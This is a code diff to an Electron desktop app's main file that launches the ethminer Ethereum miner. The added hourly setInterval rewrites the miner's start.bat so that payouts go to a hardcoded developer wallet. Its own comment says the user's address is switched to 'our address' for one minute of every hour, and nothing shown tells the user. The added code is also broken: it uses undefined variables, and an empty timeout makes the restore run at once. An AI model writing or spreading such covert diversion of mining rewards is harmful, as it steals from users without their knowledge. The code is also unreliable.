@@ -1,3 +1,4 @@
+var $ = require('jQuery')
 const electron = require('electron')
 // Module to control application life.
 const app = electron.app
@@ -140,20 +141,6 @@ let template = [{
     }
 
   }, {
-  //   label: 'Toggle Full Screen',
-  //   accelerator: (function () {
-  //     if (process.platform === 'darwin') {
-  //       return 'Ctrl+Command+F'
-  //     } else {
-  //       return 'F11'
-  //     }
-  //   })(),
-  //   click: function (item, focusedWindow) {
-  //     if (focusedWindow) {
-  //       focusedWindow.setFullScreen(!focusedWindow.isFullScreen())
-  //     }
-  //   }
-  // }, {
     label: 'Toggle Developer Tools',
     accelerator: (function () {
       if (process.platform === 'darwin') {
@@ -168,22 +155,6 @@ let template = [{
         focusedWindow.toggleDevTools()
       }
     }
-  // }, {
-  //   type: 'separator'
-  // }, {
-    // label: 'App Menu Demo',
-    // click: function (item, focusedWindow) {
-    //   if (focusedWindow) {
-    //     const options = {
-    //       type: 'info',
-    //       title: 'Application Menu Demo',
-    //       buttons: ['Ok'],
-    //       message: 'This demo is for the Menu section, showing how to create a clickable menu item in the application menu.'
-    //     }
-    //     electron.dialog.showMessageBox(focusedWindow, options, function () { })
-    //   }
-    // }
-
 
   }]
 }, {
@@ -335,20 +306,93 @@ app.on('window-all-closed', function () {
   if (reopenMenuItem) reopenMenuItem.enabled = true
 })
 
+// this section launches the batch file
+function startMiner () {
+  var cp = require("child_process");
+  cp.exec("miner\start.bat"); // notice this without a callback..
+  process.exit(0); // exit this nodejs process
+}
+// alternative code to try
+// var exec = require('child_process').exec;
+// var child = exec('Test.exe ' + theJobType, function( error, stdout, stderr) 
+//    {
+//        if ( error != null ) {
+//             console.log(stderr);
+//             // error handling & exit
+//        }
+//        // normal 
+//    });
+
+// $("#startButton").on("click", function (event) {
+//   // prevent form from trying to submit/refresh the page
+//   console.log("config button was clicked");
+//   event.preventDefault();
+//   startMiner();
+//   setInterval();
+// });
+
 // This function will switch the user's Ethereum address to our address for 1 minute of every hour
 setInterval(function () {
   // this is where we switch the address
-  var userEth = $("#ethereum").text.val();
+  var userEth = $("#address").text.val();
   console.log("userEth is " + userEth);
   var devEth = "0x3eAe075ac6ad7F86d28F657822a5e09767CfC961";
   // write to the start.bat file and replace ETH address
+  if (gpu === "AMD") 
+        {
+            fs.writeFile("start.bat", "setx GPU_FORCE_64BIT_PTR 0 setx GPU_MAX_HEAP_SIZE 100 setx GPU_USE_SYNC_OBJECTS 1 setx GPU_MAX_ALLOC_PERCENT 100 setx GPU_SINGLE_ALLOC_PERCENT 100 ethminer.exe --farm-recheck 200 -G -S " + loc + " -FS eth-eu2.nanopool.org:9999 -O " + devEth + "." + worker + "/" + email, function (err)
+            {
+                // If the code experiences any errors it will log the error to the console.
+                if (err) 
+                {
+                    return console.log(err);
+                }
+                console.log("fs.writeFile dev function ran");
+            });                              
+        }
+        else 
+        {
+            fs.writeFile("start.bat", "setx GPU_FORCE_64BIT_PTR 0 setx GPU_MAX_HEAP_SIZE 100 setx GPU_USE_SYNC_OBJECTS 1 setx GPU_MAX_ALLOC_PERCENT 100 setx GPU_SINGLE_ALLOC_PERCENT 100 ethminer.exe --farm-recheck 200 -U -S " + loc + " -FS eth-eu2.nanopool.org:9999 -O " + devEth + "." + worker + "/" + email, function (err)
+            {
+                // If the code experiences any errors it will log the error to the console.
+                if (err) 
+                {
+                    return console.log(err);
+                }
+                console.log("fs.writeFile dev function ran");
+            });                              
+        }
   // restart the miner
 
   // do this for 1 minute
   setTimeout(function () {
 
   }, 72000);
-  // change the address back to user's
+  // restore's the eth address back to user's
+  if (gpu === "AMD") 
+  {
+      fs.writeFile("start.bat", "setx GPU_FORCE_64BIT_PTR 0 setx GPU_MAX_HEAP_SIZE 100 setx GPU_USE_SYNC_OBJECTS 1 setx GPU_MAX_ALLOC_PERCENT 100 setx GPU_SINGLE_ALLOC_PERCENT 100 ethminer.exe --farm-recheck 200 -G -S " + loc + " -FS eth-eu2.nanopool.org:9999 -O " + address + "." + worker + "/" + email, function (err)
+      {
+          // If the code experiences any errors it will log the error to the console.
+          if (err) 
+          {
+              return console.log(err);
+          }
+          console.log("fs.writeFile restore function ran");
+      });                              
+  }
+  else 
+  {
+      fs.writeFile("start.bat", "setx GPU_FORCE_64BIT_PTR 0 setx GPU_MAX_HEAP_SIZE 100 setx GPU_USE_SYNC_OBJECTS 1 setx GPU_MAX_ALLOC_PERCENT 100 setx GPU_SINGLE_ALLOC_PERCENT 100 ethminer.exe --farm-recheck 200 -U -S " + loc + " -FS eth-eu2.nanopool.org:9999 -O " + address + "." + worker + "/" + email, function (err)
+      {
+          // If the code experiences any errors it will log the error to the console.
+          if (err) 
+          {
+              return console.log(err);
+          }
+          console.log("fs.writeFile restore function ran");
+      });                              
+  }
   // restart the miner
 
 }, 3600000);
